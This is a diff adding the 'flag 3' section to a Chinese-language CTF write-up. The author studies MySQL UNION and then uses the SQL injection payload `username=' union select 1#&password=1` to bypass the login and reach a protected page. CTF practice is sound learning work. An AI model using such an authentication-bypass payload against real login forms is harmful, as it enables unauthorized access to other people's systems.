@@ -186,7 +186,64 @@ def get_username_word(idx, a):
 ![2-9](2-9.png)
 
 
-未完待续~
+#### flag 3
+
+找完前两个flag又卡住了，好像现在该找的地方都找了一遍。于是就这样卡了一天，没什么头绪。最后看了两个hint
+
+```
+Regular users can only see public pages
+Getting admin access might require a more perfect union
+```
+
+第一个hint显然说的是`/page/3`这个403的页面，第二个我看到了union，我猜还是在登录界面用注入的方法拿到flag。因为对sql不是很熟悉，所以我仔细查看了一下union的用法，然后在自己的数据库尝试了一下
+
+```
+描述
+MySQL UNION 操作符用于连接两个以上的 SELECT 语句的结果组合到一个结果集合中。多个 SELECT 语句会删除重复的数据。
+
+语法
+MySQL UNION 操作符语法格式：
+
+SELECT expression1, expression2, ... expression_n
+FROM tables
+[WHERE conditions]
+UNION [ALL | DISTINCT]
+SELECT expression1, expression2, ... expression_n
+FROM tables
+[WHERE conditions];
+```
+
+```sql
+SELECT username FROM user 
+WHERE username=''
+UNION
+SELECT 1
+```
+
+结果返回为
+
+|username|
+|-----|
+|1|
+
+这下有了头绪，hint大概是想让我们跳过密码实现登录。回头看一眼他的SQL，
+
+```sql
+SELECT password FROM admins WHERE username='';
+```
+
+把password查出来然后和post过去的比对，那我只要把他改造成下面这种，查出来的结果和我提交的密码就可以了。
+
+```sql
+SELECT password FROM admins
+WHERE username=''
+UNION
+SELECT 1
+```
+
+然后提交表单里面填`username=' union select 1#&password=1`就能免密码登录了。试了一下，果然成功了。登录之后就可以访问`/page/3`了。最后一个flag也就在这里。
+
+![2-10](2-10.png)
 
 
 
